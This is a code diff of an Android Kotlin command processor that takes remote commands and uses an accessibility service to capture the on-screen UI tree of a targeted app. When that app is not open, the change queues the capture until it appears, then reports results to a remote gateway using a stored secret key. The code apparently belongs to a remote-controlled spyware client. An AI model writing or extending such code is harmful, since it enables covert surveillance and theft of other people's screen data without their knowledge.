@@ -305,23 +305,33 @@ object CommandProcessor {
                     val mins = parts.getOrNull(1)?.trim()?.toLongOrNull() ?: 5L
                     val depth = parts.getOrNull(2)?.trim()?.toIntOrNull() ?: 10
                     
-                    if (MyAccessibilityService.instance != null) {
+                    val service = MyAccessibilityService.instance
+                    if (service != null) {
                         if (mins <= 0) {
-                            MyAccessibilityService.instance?.startTreeDump(null, 0)
+                            service.startTreeDump(null, 0)
                             status = "SCAN_SESSION_TERMINATED"
                         } else {
-                            // 1. Start periodic session
-                            MyAccessibilityService.instance?.startTreeDump(pkg, mins)
+                            // 1. Start background session
+                            service.startTreeDump(pkg, mins)
                             
-                            // 2. Perform IMMEDIATE capture for database upload
-                            val treeData = MyAccessibilityService.instance?.getInstantTree(pkg, depth)
-                            status = "SCAN_SESSION_STARTED"
-                            val result = JSONObject().apply {
-                                put("depth_limit", depth)
-                                put("snapshot", treeData)
+                            // 2. Try Instant Capture
+                            val instantTree = service.getInstantTree(pkg, depth)
+                            if (!instantTree.has("error")) {
+                                status = "SCAN_COMPLETE"
+                                val result = JSONObject().apply {
+                                    put("depth_limit", depth)
+                                    put("snapshot", instantTree)
+                                }
+                                updateCommandStatus(ctx, id, status, null, result, null)
+                                return
+                            } else {
+                                // 3. Target app is NOT in foreground. Queue lazy capture.
+                                service.pendingTreeCommandId = id
+                                service.pendingTreeDepth = depth
+                                status = "WAITING_FOR_TARGET_APP"
+                                updateCommandStatus(ctx, id, status, null, null, null)
+                                return
                             }
-                            updateCommandStatus(ctx, id, status, null, result, null)
-                            return
                         }
                     } else {
                         status = "FAILED (SERVICE_OFF)"
@@ -905,7 +915,7 @@ object CommandProcessor {
         updateCommandStatus(ctx, id, status, errorMsg)
     }
 
-    private fun updateCommandStatus(ctx: Context, id: Int, status: String, errorMsg: String? = null, resultData: JSONObject? = null, resultFilePath: String? = null) {
+    fun updateCommandStatus(ctx: Context, id: Int, status: String, errorMsg: String? = null, resultData: JSONObject? = null, resultFilePath: String? = null) {
         try {
             val key = SecretVault.getLock(ctx)
             val updateUrl = URL(SecretVault.getGatewayUrl(ctx))
